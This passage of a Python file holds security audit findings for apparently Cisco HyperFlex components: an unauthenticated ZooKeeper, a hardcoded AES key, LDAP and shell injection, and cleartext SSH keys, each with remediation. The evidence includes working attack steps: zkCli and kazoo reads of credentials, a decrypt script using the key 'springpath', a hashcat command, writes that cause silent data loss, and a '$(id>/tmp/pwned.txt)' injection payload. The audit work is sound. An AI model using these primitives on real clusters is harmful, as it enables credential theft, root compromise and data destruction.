        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the passthrough pattern with an enforcement pattern: "
            "when X-ServiceAccessToken is absent or validateServiceAccessToken returns null, "
            "call response.sendError(HttpServletResponse.SC_UNAUTHORIZED) and return — "
            "do NOT call chain.doFilter(). "
            "Set hxSvcHttpEnabled=false and hyperVSvcHttpEnabled=false to require TLS "
            "for all inter-service communication."
        ),
    },
    "HX-F014": {
        "title": (
            "HXCertificateZKMonitor Overwrites NGINX TLS Certificate and Private Key from "
            "ZooKeeper Path /certificates/hxcertificate — Unauthenticated ZK Write Enables "
            "MITM of All HTTPS Management Traffic with Explicit SFI Suppression"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXCertificateZKMonitor / writeSslCert + writeSslKey + restartNginx / "
            "/etc/nginx/server.crt + /etc/nginx/server.key"
        ),
        "class": "Unauthenticated ZK Write Replaces nginx TLS Cert/Key + Suppresses Integrity Check",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXCertificateZKMonitor.registerNodeCacheListener(): "
                "zkClient.registerNodeCacheListenerForPath('/certificates/hxcertificate', $1). "
                "NodeCache watcher fires on any ZK data change to /certificates/hxcertificate."
            ),
            "nodeChanged_chain": (
                "HXCertificateZKMonitor$1.nodeChanged() at offset 28-87: "
                "zkClient.getDataInPath('/certificates/hxcertificate', Type<HxCertificate>) -> hxCert; "
                "writeSslCert(hxCert.getCertificateString()); "
                "writeSslKey(hxCert.getPrivateKeyString()); "
                "restartNginx()."
            ),
            "writeSslCert_direct_write": (
                "writeSslCert(String) at offsets 0-56: "
                "File(NGINX_CERT_PATH).setReadable(true, false); "
                "PrintWriter(NGINX_CERT_PATH, 'UTF-8').print(zkData); // direct unvalidated write "
                "NGINX_CERT_PATH = '/etc/nginx/server.crt' (from application.conf nginx.CertificatePath)."
            ),
            "writeSslKey_direct_write": (
                "writeSslKey(String): analogous to writeSslCert. "
                "NGINX_KEY_PATH = '/etc/nginx/server.key' (from application.conf nginx.PrivateKeyPath)."
            ),
            "sfi_suppression": (
                "After restartNginx() at offset 90: "
                "logger.warn('Supressed SFI - Baseline Update for System File Integrity is Skipped!'). "
                "System File Integrity monitoring is explicitly bypassed after cert/key write — "
                "replacement is not flagged by integrity monitoring."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "ZK port 2181 unauthenticated (confirmed in application.conf: defaultConnectionString='localhost:2181'). "
                "HX-F95 confirms ZK listens on cluster IP with no mandatory auth."
            ),
            "exploit_scenario": (
                "Attacker with ZK write access (port 2181, no auth required by default): "
                "1. Construct HxCertificate JSON with attacker-controlled cert+key strings; "
                "2. zkCli.sh -server <clusterIP>:2181 set /certificates/hxcertificate '<json>'; "
                "3. NodeCache watcher fires; nginx cert/key replaced; nginx restarted; SFI suppressed; "
                "4. All HTTPS traffic to HyperFlex management (port 443) is now MITM-able. "
                "5. Attacker-controlled cert in place — login credentials harvested from HX Connect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /certificates/ subtree to restrict writes to authenticated sessions only. "
            "Do not accept raw cert/key material from ZK without signature verification by a trusted CA. "
            "Replace direct PrintWriter write with a CA-signed certificate rotation workflow. "
            "Do not suppress SFI — cert changes must trigger an integrity baseline update, not skip it."
        ),
    },
    "HX-F015": {
        "title": (
            "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey() Reads "
            "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY from ZooKeeper — "
            "stCtlVM SSH Private Key Stored and Retrieved in Cleartext via "
            "Unauthenticated ZK Read"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": (
            "com.storvisor.sysmgmt.stNodeMgr.ZKQueryService_StNodeMgr / "
            "ZKNodeService_StNodeMgr / stNodeMgr service — "
            "stCtlVM SSH key management via ZooKeeper"
        ),
        "evidence": {
            "read_uses_plain_text_entry": (
                "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(hostname): "
                "offset 3: invokevirtual STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY:()String. "
                "Despite method name 'Encrypted', implementation reads "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (ZK key: 'key') — the cleartext variant. "
                "Returns raw private key string from ZK without decryption."
            ),
            "write_path_plain_text": (
                "ZKNodeService_StNodeMgr.setSSHEncryptedPrivateKey(value, encrypted): "
                "encrypted=false branch (offset 14): getNodeEntry_SSHPlainTextPrivateKey(value) -> "
                "updateZKNodeEntry(). "
                "Default $default$2() -> true (encrypted=true is the default write path). "
                "Plain text path is explicitly written when encrypted=false is passed. "
                "getStCtlSSHEncryptedPrivateKey reads this plain text path in production."
            ),
            "dual_entry_structure": (
                "ZK contains two variants per stCtlVM host: "
                "STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PRIVATE_KEY (encrypted, default write), "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (cleartext, read by production code). "
                "SSH public key mirrored: SSH_ENCRYPTED_PUBLIC_KEY and SSH_PLAIN_TEXT_PUBLIC_KEY. "
                "NonVMWStMgrImpl uses getStCtlSSHEncryptedPrivateKey() for SSH connection setup."
            ),
            "zk_access_prerequisite": (
                "ZK auth disabled by default (HX-F102/F103). "
                "Attack: zkCli.sh get /storvisor/stNodeMgr/<hostname>/... -> "
                "SSH private key in plaintext -> "
                "ssh -i key springpath@<stCtlVM-ip> -> full stCtlVM shell access."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Rename getStCtlSSHEncryptedPrivateKey to accurately reflect it reads plaintext. "
            "Store only encrypted SSH private keys in ZK; require decryption before use. "
            "Ensure setSSHEncryptedPrivateKey never uses encrypted=false in production code paths. "
            "Enable ZK auth (HX-F102/F103 remediation). "
            "Restrict ZK port 2181 to localhost/management VLAN. "
            "Rotate all stCtlVM SSH key pairs after any ZK exposure incident."
        ),
    },
    "HX-F016": {
        "title": (
            "LdapDriver.getAdUserPrincipal() Uses MessageFormat.format() Without LDAP Filter Escaping "
            "to Construct sAMAccountName Search Filter — LDAP Injection via Login Username"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-90",
        "component": (
            "com.springpath.hx.aaa.gateway.adAuthenticator.LdapDriver / getAdUserPrincipal() "
            "— Active Directory LDAP authentication gateway"
        ),
        "evidence": {
            "injection_site": (
                "getAdUserPrincipal() offset 37-53: "
                "MessageFormat.format('(&(objectCategory=user)(sAMAccountName={0}))', "
                "userContext.getUserAccountName()). "
                "No LDAP filter escaping applied to the username before substitution. "
                "LDAP metacharacters (*, (, ), \\, \\0) in the username are passed verbatim "
                "into the filter string."
            ),
            "correct_api": (
                "RFC 4515 requires special characters to be escaped before use in LDAP filters. "
                "The correct approach is LdapConnection.encodeFilterValue(username) or "
                "encodeForLDAP(username) before substitution. "
                "MessageFormat.format() performs no LDAP escaping."
            ),
            "bind_vs_search_paths": (
                "openLdapContext() at offset 64: LDAP bind uses getUserPrincipalName() (UPN form, user@domain). "
                "getAdUserPrincipal() at offset 46: LDAP search uses getUserAccountName() (sAMAccountName form). "
                "The bind and search inputs may derive from different parts of the username, "
                "allowing a valid bind with crafted sAMAccountName for the search filter."
            ),
            "impact": (
                "A domain user who authenticates successfully (LDAP bind with correct password) "
                "can supply a crafted sAMAccountName portion that manipulates the search filter. "
                "Filter injection can return a different user's directory object, "
                "yielding that user's DN and group memberships to the HyperFlex authorization layer. "
                "Example: sAMAccountName='*' -> filter '(&(objectCategory=user)(sAMAccountName=*)' "
                "returns the first AD object in enumeration order rather than the authenticated user. "
                "An attacker can obtain admin-group memberships of a HyperFlex admin user "
                "while authenticating with their own (non-admin) AD password."
            ),
            "second_filter": (
                "expandGroups() at constant pool #73: "
                "filter '(&(objectCategory=group)(cn={0}))' also uses MessageFormat.format(). "
                "Group CNs injected into this filter could enumerate arbitrary group objects."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace MessageFormat.format() with parameterized LDAP search using "
            "SearchControls and a properly escaped filter. "
            "Use OWASP ESAPI's Encoder.encodeForLDAP() or javax.naming attribute-level binding "
            "instead of building filter strings with user input. "
            "Apply the same fix to the group CN filter in expandGroups()."
        ),
    },
    "HX-F017": {
        "title": (
            "VC Plugin Installer install_vc_plugin.py: Shell Injection via stcli-Supplied "
            "Management IP in get_server_thumbprint() — Credential Exposure via verify=False "
            "and AutoAddPolicy SSH MITM"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-78",
        "component": (
            "HyperFlex-VC-HTML-Plugin-2.2.0.zip / install_vc_plugin.py "
            "(plugin installer, run on stCtlVM)"
        ),
        "evidence": {
            "shell_injection_site": (
                "get_server_thumbprint(host): "
                "subprocess.Popen("
                "    'openssl s_client -connect %s:443 ... | openssl x509 ...' % (host), "
                "    shell=True, ...). "
                "The 'host' parameter comes from get_cluster_mgmt_ip() which executes: "
                "    Popen('stcli node list --summary | awk /mgmtClusterIp/ {print $2}', shell=True). "
                "stcli output is passed unsanitized into the second shell command. "
                "If an attacker controls ZooKeeper (world:anyone:cdrwa — HX-F100) "
                "they can poison the cluster management IP stored in ZK, causing stcli "
                "to return a crafted string containing shell metacharacters. "
                "The crafted string is then interpolated into the openssl shell command, "
                "achieving OS command execution under the plugin installer's user context."
            ),
            "chained_via_zk": (
                "HX-F100 (ZK ACL world:anyone:cdrwa) + HX-F017: "
                "ZK write access → poison mgmtClusterIp → stcli returns crafted IP → "
                "shell=True subprocess → arbitrary command execution on stCtlVM "
                "during plugin installation."
            ),
            "tls_verify_false": (
                "get_from_hx(admin_pass, url): requests.get(url, auth=('admin', admin_pass), verify=False). "
                "Called with HTTP (not HTTPS) URLs: "
                "  http://<HOST>/coreapi/v1/hypervisor/vcenter "
                "  http://<HOST>/coreapi/v1/hypervisor/controllervms. "
                "Admin password transmitted in HTTP Basic Auth over cleartext HTTP. "
                "Management network MITM recovers admin credentials without TLS interception."
            ),
            "ssh_mitm": (
                "check_connection() and copy_file() use "
                "paramiko.AutoAddPolicy() — accepts any SSH host key. "
                "Plugin ZIP is copied to all stCtlVMs as root via SFTP. "
                "Network MITM on plugin distribution installs malicious plugin on all nodes. "
                "Root SSH credentials transmitted over unverified SSH connection."
            ),
            "admin_pass_scope": (
                "ADMIN_PASS (storage controller admin password) is used as: "
                "  (1) HTTP Basic Auth credential for coreapi calls "
                "  (2) SSH password for stCtlVM plugin copy. "
                "Single credential loss via MITM provides both REST API and SSH access "
                "to all cluster controller VMs."
            ),
            "ssl_context_bypass": (
                "perform_vc_extension_task(): "
                "ssl._create_unverified_context() used for vCenter SmartConnect. "
                "vCenter SOAP API credentials transmitted over unverified TLS."
            ),
        },
        "versions_affected": ["HyperFlex-VC-HTML-Plugin-2.2.0 (install_vc_plugin.py)"],
        "remediation": (
            "get_server_thumbprint: use subprocess.Popen with list args (not shell=True). "
            "Validate host against IP address format before use in any command. "
            "get_from_hx: change URLs from http:// to https:// and set verify=True. "
            "copy_file: replace AutoAddPolicy with RejectPolicy + explicit known_hosts validation. "
            "Use ssl.create_default_context() for vCenter connection."
        ),
    },
}

HX_F018 = {
    "id": "HX-F018",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /user_credentials Path Stores SHA-256 crypt(3) "
        "Hashes for root, admin, and diag Accounts; Readable Without Authentication via "
        "HX-F100 World ACL — Offline Hash Cracking Yields OS Root and Admin Credentials"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-916",
    "component": (
        "HyperFlex HXDP 5.5.2b (hxSecuritySvcMgr-1.0, PasswordOperations, "
        "mkpasswd.sh, setpasswd.sh); ZooKeeper ensemble (world:anyone:cdrwa via HX-F100)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "The hxSecuritySvcMgr daemon synchronizes operating system credentials for the "
        "root, admin, and diag accounts to ZooKeeper at path /user_credentials. The "
        "credential entry format is 'username:hash;' where the hash is a SHA-256 crypt(3) "
        "value (\\$5\\$...) generated by mkpasswd -m sha-256. Synchronization is enabled by "
        "default (syncEnabled = true) and covers all three accounts.\n\n"
        "The ZK namespace carries a world:anyone:cdrwa ACL (HX-F100). Any host with network "
        "access to ZooKeeper port 2181 can read /user_credentials without credentials, "
        "obtaining the SHA-256 crypt hashes for all three synchronized accounts. SHA-256 "
        "crypt (hashcat mode 7400) can be cracked on GPU hardware. The root hash grants "
        "OS root access via SSH or console (PermitRootLogin yes is the HXDP default). "
        "The admin hash grants full HX Connect cluster management API access.\n\n"
        "The credential sync feature is architecturally necessary: when admin changes the "
        "admin password via HX Connect, hxSecuritySvcMgr writes the new hash to ZK so all "
        "storage controller VMs in the cluster can apply it locally. The ZK read path "
        "exposes the current in-use credentials, not stale build-time values."
    ),
    "evidence": {
        "zk_path": "/user_credentials",
        "sync_config": (
            "# hxSecuritySvcMgr-1.0.jar embedded application.conf:\n"
            "password {\n"
            "  zkPath = '/user_credentials'\n"
            "  syncEnabled = true\n"
            "  syncAccounts = ['root', 'admin', 'diag']\n"
            "}"
        ),
        "credential_format": (
            "# Inferred from PasswordOperations.syncPwToZK + split(':', ';') parsing:\n"
            "# ZK value at /user_credentials:\n"
            "#   root:$5$<salt>$<sha256crypt>;admin:$5$<salt>$<sha256crypt>;diag:$5$<salt>$<sha256crypt>;\n"
            "# Generated by mkpasswd.sh (mkpasswd -m sha-256)"
        ),
        "hash_scripts": (
            "# mkpasswd.sh:\n"
            "echo ${1} | mkpasswd -m sha-256 -s\n\n"
            "# setpasswd.sh (chpasswd -e = pre-encrypted input):\n"
            "echo -e ${user}:${pass} | chpasswd -e"
        ),
        "acl_chain": (
            "HX-F100: setAcls(['world:anyone:cdrwa'], '/') on ZK startup\n"
            "=> /user_credentials inherits world:anyone:cdrwa\n"
            "=> zkCli.sh -server <hx-ctlvm>:2181 get /user_credentials returns all three hashes"
        ),
        "crack_path": (
            "hashcat -m 7400 /user_credentials.txt /usr/share/wordlists/rockyou.txt\n"
            "# mode 7400 = sha256crypt (\\$5\\$)\n"
            "# Root hash cracked -> SSH as root to all cluster nodes\n"
            "# Admin hash cracked -> curl -k -d '{user,pass}' https://<hx>/rest/auth/token"
        ),
    },
}


HX_F019 = {
    "id": "HX-F019",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /storvisor2/stCluster Stores AES/ECB-Encrypted "
        "ESXi, vCenter, and UCSM Credentials; Hardcoded Key 'springpath' Confirmed in "
        "EsxAuthZKMgmtImpl — Plaintext Full-Stack Infrastructure Credentials via ZK Read"
    ),
    "severity": "CRITICAL",
    "cvss": "9.8",
    "cwe": "CWE-321",
    "component": (
        "HyperFlex HXDP 5.5.2b (stMgr-1.0.jar, common-1.0.jar, hxSecuritySvcMgr-1.0.jar); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
    ),
    "versions_affected": (
        "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); all versions with ZK credential storage "
        "architecture (Springpath-era origin, stMgr compiled 2025-04-28)"
    ),
    "description": (
        "ZooKeeper node /storvisor2/stCluster holds a JSON payload managed by "
        "ZKNodeService_StMgr (DefaultZKPayloadNodeService subclass). The payload contains "
        "AES/ECB-encrypted credentials for all components in the HyperFlex management plane: "
        "ESXi host username/password, vCenter SSO URL + encrypted username/password, and "
        "Cisco UCS Manager hostname + encrypted username/password. "
        "The encryption key is the literal string 'springpath' — confirmed present in the "
        "EsxAuthZKMgmtImpl class constant pool (Utf8 entry between "
        "'Failed to initialize root esx credentials' and 'Successfully logged in to ESX node'). "
        "BasicEncryptionUtil applies AES/ECB/PKCS5Padding with SHA-256 key derivation from "
        "the caller-supplied string. Since the ZK ACL is world:anyone:cdrwa (HX-F100), "
        "any unauthenticated ZK client on port 2181 can read the payload and decrypt all "
        "credentials offline with a 10-line Python script. "
        "Scope: ESXi admin → direct hypervisor console on all cluster nodes. "
        "vCenter admin → VM inventory, snapshots, network, storage policy on the entire datacenter. "
        "UCSM admin → physical blade management, BMC/KVM console, fabric interconnect config."
    ),
    "evidence": {
        "zk_path": "/storvisor2/stCluster",
        "zk_path_derivation": (
            "ZKConstants$.BASE_PATH = '/storvisor2' (Utf8 in ZKConstants$.class, common-1.0.jar). "
            "ZKConstants$.SERVICE_NAME_MGR = 'stCluster'. "
            "DefaultZKPayloadNodeService builds path as BASE_PATH + '/' + SERVICE_NAME. "
            "Result: /storvisor2/stCluster."
        ),
        "credential_fields": {
            "esx_username": "AES/ECB encrypted ESXi host username (all cluster nodes share one account)",
            "esx_password": "AES/ECB encrypted ESXi host password",
            "url_vcenter_sso": "vCenter SSO endpoint URL (plaintext)",
            "url_vcenter_encrypted_user": "AES/ECB encrypted vCenter username",
            "url_vcenter_encrypted_password": "AES/ECB encrypted vCenter password",
            "ucsm_hostname": "Cisco UCS Manager hostname (plaintext)",
            "ucsm_user": "AES/ECB encrypted UCSM username",
            "ucsm_pwd": "AES/ECB encrypted UCSM password",
            "user_credentials": "OS account SHA-256 crypt hashes (see HX-F018)",
        },
        "field_name_source": (
            "ZKEntryConstants.class from common-1.0.jar Utf8 constant pool: "
            "  esx_username, esx_password "
            "  url_vcenter_sso, url_vcenter_encrypted_user, url_vcenter_encrypted_password "
            "  ucsm_hostname, ucsm_user, ucsm_pwd "
            "  user_credentials "
            "Field constant names: STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD, STR_PAYLOAD_ENTRY_URL_VCENTER_SSO, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD, "
            "STR_PAYLOAD_ENTRY_UCSM_HOST, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD."
        ),
        "aes_key_confirmation": (
            "EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, compiled 2025-04-28) Utf8 constant pool:\n"
            "  #N  Utf8  springpath\n"
            "Position in pool: between 'Failed to initialize root esx credentials' "
            "and 'Successfully logged in to ESX node'. "
            "Methods that reference springpath: getEsxCredentialsFromZK, "
            "updateAndSaveRandomEsxPasswordToZK, initializeVirtPlatformNodeLoginFromRoot. "
            "Same 'springpath' literal appears as keyStorePass in hxSecuritySvcMgr "
            "syslog TLS config (HX-F129) — shared hardcoded string across two unrelated "
            "subsystems confirms it is a project-level constant."
        ),
        "encryption_primitive": (
            "BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar): "
            "  cipher = Cipher.getInstance('AES/ECB/PKCS5Padding'); "
            "  key = MessageDigest.getInstance('SHA-256').digest(keyStr.getBytes()); "
            "  secretKeySpec = new SecretKeySpec(key, 'AES'); "
            "  cipher.init(DECRYPT_MODE, secretKeySpec); "
            "  return cipher.doFinal(Base64.decode(encryptedData))."
        ),
        "decrypt_primitive": (
            "import hashlib, base64\n"
            "from Crypto.Cipher import AES\n"
            "\n"
            "def hxdp_decrypt(b64_ciphertext: str, key_str: str = 'springpath') -> str:\n"
            "    key = hashlib.sha256(key_str.encode()).digest()\n"
            "    ct = base64.b64decode(b64_ciphertext)\n"
            "    cipher = AES.new(key, AES.MODE_ECB)\n"
            "    raw = cipher.decrypt(ct)\n"
            "    pad = raw[-1]\n"
            "    return raw[:-pad].decode()\n"
            "\n"
            "# Usage: hxdp_decrypt(zk_payload['esx_password'])\n"
            "# pycryptodome: pip install pycryptodome"
        ),
        "zk_read_primitive": (
            "# Read /storvisor2/stCluster from ZK without authentication:\n"
            "from kazoo.client import KazooClient\n"
            "import json\n"
            "zk = KazooClient(hosts='<stCtlVM_IP>:2181')\n"
            "zk.start()\n"
            "data, _ = zk.get('/storvisor2/stCluster')\n"
            "payload = json.loads(data)\n"
            "esx_pass = hxdp_decrypt(payload['esx_password'])\n"
            "vc_user = hxdp_decrypt(payload['url_vcenter_encrypted_user'])\n"
            "vc_pass = hxdp_decrypt(payload['url_vcenter_encrypted_password'])\n"
            "ucsm_pass = hxdp_decrypt(payload['ucsm_pwd'])\n"
            "zk.stop()"
        ),
        "acl_chain": (
            "HX-F100: world:anyone:cdrwa on / — all ZK paths readable without credentials. "
            "Port 2181 TCP must be reachable from attacker position (management VLAN or "
            "from any stCtlVM after initial foothold on one node). "
            "No ZK authentication required; no TLS on ZK channel in default config."
        ),
        "upgrade_from_hxf119": (
            "HX-F119 documented encrypted credential storage in 'the /stMgr ZK namespace' "
            "(path inferred, not confirmed). HX-F019 confirms: "
            "  (1) Exact ZK path: /storvisor2/stCluster (not /stMgr) "
            "  (2) Exact field names from ZKEntryConstants.class "
            "  (3) AES key 'springpath' confirmed in EsxAuthZKMgmtImpl constant pool "
            "  (4) Working decrypt primitive from BasicEncryptionUtil class analysis "
            "Severity upgrade: HIGH (CWE-312, encrypted) -> CRITICAL (CWE-321, key in binary)."
        ),
    },
    "impact": (
        "ZK port 2181 reachable on management VLAN -> read /storvisor2/stCluster -> "
        "decrypt esx_password with hxdp_decrypt('springpath') -> "
        "ESXi root-equivalent access on all cluster hypervisors. "
        "vCenter admin: full datacenter virtualization plane. "
        "UCSM admin: physical server BMC, fabric interconnect, blade firmware — "
        "persistence below OS layer. "
        "Three independent admin credential classes extracted from one ZK read."
    ),
    "remediation": (
        "Immediate: rotate ESXi, vCenter, and UCSM credentials. "
        "Short-term: block ZK port 2181 from non-stCtlVM sources at the management VLAN firewall. "
        "Long-term: "
        "  (1) Apply per-node ZK ACLs: digest:hxservice:rwcda on /storvisor2/* (see HX-F100). "
        "  (2) Replace hardcoded 'springpath' AES key with per-deployment generated keys. "
        "  (3) Move credential storage from ZK to a dedicated secrets store with "
        "      per-service access policies. "
        "  (4) Enable ZK TLS and mutual authentication (ZK 3.5+ supports TLS)."
    ),
}


HX_F020 = {
    "id": "HX-F020",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: ZooKeeper World-Write on /cluster/* Paths Enables "
        "Cluster Topology Poisoning, Runtime Behavior Override, and Operation Injection via CRMApiGetPnodes"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-285",
    "component": (
        "storfs-core ZooKeeper client; ZooKeeper ensemble (clientPort 2181); "
        "CRM subsystem (CRMApiGetPnodes @ 0x710ef0, CRMDB_GetAllPnodes @ 0x809f40); "
        "world:anyone:cdrwa ACL inherited from HX-F100"
    ),
    "evidence": {
        "zk_path_inventory": {
            "topology_paths": [
                "/cluster/pnodes",
                "/cluster/pnodes/%s",
                "/cluster/pnodes/%s/disks/%s",
                "/cluster/members",
                "/cluster/master",
                "/cluster/vnodes/%u",
            ],
            "runtime_control_paths": [
                "/cluster/tunes/kvEnableNullIO",
                "/cluster/tunes/sysmClusterShutdownOnCritical",
                "/cluster/tunes/disableAutoRebalance",
                "/cluster/tunes/disableRebalance",
                "/cluster/tunes/crmEnableZKBatchRead",
                "/cluster/tunes/numFTVnodes",
                "/cluster/tunes/hbVersion",
                "/cluster/tunes/clusterType",
            ],
            "operation_injection_paths": [
                "/cluster/clusterops/req_%ld",
                "/cluster/clusterops/%s%010lu",
                "/cluster/dvreqs/dvr%010d",
                "/cluster/ft_dvs/%d_%s",
            ],
            "health_reporting_paths": [
                "/cluster/health",
                "/cluster/clientdata/health",
                "/cluster/clientdata/status",
                "/cluster/uptimestatus",
            ],
            "version_paths": [
                "/cluster/version",
                "/stCluster/%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            ],
        },
        "read_path": {
            "function": "CRMApiGetPnodes",
            "address": "0x710ef0",
            "asm_evidence": (
                "0x710fd4: lea rsi, [0xc9c187]  ; '/cluster/pnodes'\n"
                "0x710fde: call CRMDBFlush\n"
                "0x711047: call CRMDB_GetAllPnodes @ 0x809f40"
            ),
            "behavior": (
                "Reads /cluster/pnodes from ZK; populates CRM pnode list used for all "
                "storage I/O routing, replication targeting, and rebalancing decisions. "
                "No authentication check on ZK read; ACL enforcement absent per HX-F100."
            ),
        },
        "attack_chains": {
            "topology_poisoning": (
                "Write crafted JSON to /cluster/pnodes/<fake-uuid> → "
                "CRMApiGetPnodes returns ghost node → "
                "storfs routes I/O to non-existent node → "
                "I/O timeouts, data unavailability."
            ),
            "null_io_activation": (
                "Write '1' to /cluster/tunes/kvEnableNullIO → "
                "storfs-core treats all I/O as successful without writing to disk → "
                "silent data loss. "
                "Write '1' to /cluster/tunes/sysmClusterShutdownOnCritical → "
                "fabricate a critical event → force cluster shutdown."
            ),
            "operation_injection": (
                "Write a node-removal operation payload to /cluster/clusterops/req_<N> → "
                "CRM processes the fake operation → "
                "legitimate storage node removed from cluster membership → "
                "cluster degraded, data under-replicated."
            ),
            "rebalance_suppression": (
                "Write '1' to /cluster/tunes/disableRebalance → "
                "prevents data rebalancing after node additions/removals → "
                "long-term data distribution skew → capacity exhaustion on subset of nodes."
            ),
        },
        "write_primitive": (
            "From HX-F100: ZK 2181 open, world:anyone:cdrwa ACL on all paths.\n"
            "kazoo write:\n"
            "  zk.ensure_path('/cluster/tunes/kvEnableNullIO')\n"
            "  zk.set('/cluster/tunes/kvEnableNullIO', b'1')"
        ),
    },
    "impact": (
        "Network-adjacent attacker with ZK access (port 2181) → "
        "write to /cluster/tunes, /cluster/pnodes, /cluster/clusterops → "
        "silent data loss (kvEnableNullIO), cluster shutdown, topology poisoning, "
        "operation injection. No auth required. Impact: entire HyperFlex cluster."
    ),
    "remediation": (
        "Apply per-path ZK ACLs: restrict /cluster/* to stCtlVM node IPs via SASL/digest auth. "
        "Block 2181 from non-cluster hosts. "
        "Validate ZK node data schema in CRM read paths — reject unexpected node types/fields. "
        "Fix root cause: apply world:anyone:r ACL (read-only) as minimum interim control; "
        "remove cdrwa from world principal."
    ),
}

HX_F021 = {
    "id": "HX-F021",
    "title": (
        "HyperFlex HXDP 6.0.2b stNodeMgr setStretchedConfig Thrift RPC — "
        "Unsanitized AUXZK_IP Written to Sourced Shell Config → Root Command Injection"
    ),
    "severity": "CRITICAL",
    "cvss": "8.8",
    "cvss_vector": "AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "versions_affected": "6.0.2b (confirmed); 5.5.2b not checked",
    "component": "storfs-mgmt stNodeMgr-1.0 (Scala/Finagle Thrift service, port 10207)",
    "evidence": {
        "thrift_method": (
            "StNodeMgrImpl.setStretchedConfig(String auxZkIp, boolean preferredSite)\n"
            "  — no auth check; immediately wraps in futurePool:\n"
            "  0: aload_0\n"
            "  1: invokevirtual  // futurePool\n"
            "  4: aload_0\n"
            "  5: aload_1        // auxZkIp (attacker-controlled String)\n"
            "  6: iload_2\n"
            "  7: invokedynamic  // apply$mcV$sp -> writeStretchedCfgAndRestartService\n"
            "  15: areturn"
        ),
        "injection_site": (
            "writeStretchedCfgAndRestartService (StNodeMgrImpl.class):\n"
            "  31: new    StringBuilder\n"
            "  41: ldc    \"AUXZK_IP=\"               # prefix\n"
            "  44: invokevirtual StringBuilder.append(String)  # appends AUXZK_IP=\n"
            "  47: aload_1                            # attacker-supplied auxZkIp — NO validation\n"
            "  48: invokevirtual StringBuilder.append(String)  # appends raw value\n"
            "  51: invokevirtual StringBuilder.toString\n"
            "  ...writes list as /etc/hyperflex/stretched.cfg\n"
            "  ...calls startSystemdService(\"hxArbitratorSvcMgr\")"
        ),
        "shell_source": (
            "auxzk-start.sh (storfs-stretched_6.0.2b-44423_amd64.deb):\n"
            "  line 7:  . /etc/hyperflex/stretched.cfg    # POSIX source — executes as shell\n"
            "  line 51: setup_aux_if ${AUXZK_IP}          # then uses AUXZK_IP in iptables/ip link\n"
            "  Script runs as root (mounts chroot, iptables, chroot /bin/bash)"
        ),
        "crash_trigger": (
            "setStretchedConfig('$(id>/tmp/pwned.txt)', false)  via Thrift on port 10207:\n"
            "  -> /etc/hyperflex/stretched.cfg contains:  AUXZK_IP=$(id>/tmp/pwned.txt)\n"
            "  -> hxArbitratorSvcMgr restarts\n"
            "  -> auxzk-start.sh line 7 sources the file\n"
            "  -> shell expands $(...) as command substitution -> executes as root"
        ),
        "auth_requirement": (
            "Thrift method setStretchedConfig has no token/auth check at the method level.\n"
            "stNodeMgr exposes a sessionToken() that reads /etc/hyperflex/secure/root_file.pub,\n"
            "but this token is not validated in setStretchedConfig or its lambda.\n"
            "Port 10207 is not in the firewall_allowed_ports list in application.conf,\n"
            "suggesting cluster-internal network access is sufficient (AV:A).\n"
            "If port 10207 is reachable from the management network, CVSS becomes 9.8 (AV:N)."
        ),
    },
    "remediation": (
        "1. Validate auxZkIp against a strict IPv4/IPv6 regex before any string operation.\n"
        "   Reject inputs containing shell metacharacters ($, `, ;, &, |, >, <, \\n, \\r).\n"
        "2. Do not write shell-variable-assignment syntax to files that are sourced.\n"
        "   Use a key=value properties parser in auxzk-start.sh instead of `. stretched.cfg`.\n"
        "   Replace `AUXZK_IP=$(...)` expansion with explicit validated env var export.\n"
        "3. Add Finagle request filter enforcing session token on all stNodeMgr Thrift methods\n"
        "   that modify cluster configuration (setStretchedConfig, initializeZookeeper, etc.).\n"
        "4. Restrict port 10207 to cluster storage network; block from management/ESXi network."
    ),
}

HX_F022 = {
    "id": "HX-F022",
    "title": (
